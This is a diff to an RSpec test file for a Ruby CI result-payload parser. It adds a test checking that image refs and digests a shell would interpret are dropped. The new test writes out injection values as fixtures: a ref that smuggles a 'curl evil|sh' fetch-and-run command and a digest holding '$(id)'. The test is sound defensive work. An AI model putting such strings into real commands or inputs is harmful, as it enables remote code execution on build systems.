@@ -8,7 +8,7 @@ RSpec.describe PatchCi::ResultPayload do
       status: "tests_failed",
       build: { ok: true, seconds: 240 },
       tests: { ok: false, seconds: 610, timed_out: false, failed: [ "regress/inherit" ] },
-      image: { ref: "ghcr.io/x/y:t1", digest: "sha256:abc" },
+      image: { ref: "ghcr.io/x/y:t1", digest: "sha256:#{"a" * 64}" },
       ccache: { hit: 812, miss: 143 }
     }.merge(overrides).to_json
   end
@@ -23,6 +23,15 @@ RSpec.describe PatchCi::ResultPayload do
     expect(result.test_seconds).to eq(610)
     expect(result.image_ref).to eq("ghcr.io/x/y:t1")
     expect(result.run_id).to eq(5)
+  end
+
+  it "drops image refs and digests a shell would interpret" do
+    result = described_class.parse(valid_json(image: { ref: "ghcr.io/x:t1; curl evil|sh #:t1",
+                                                       digest: "sha256:abc $(id)" }))
+
+    expect(result).to be_valid
+    expect(result.image_ref).to eq("")
+    expect(result.image_digest).to eq("")
   end
 
   it "rejects an oversized payload without parsing" do
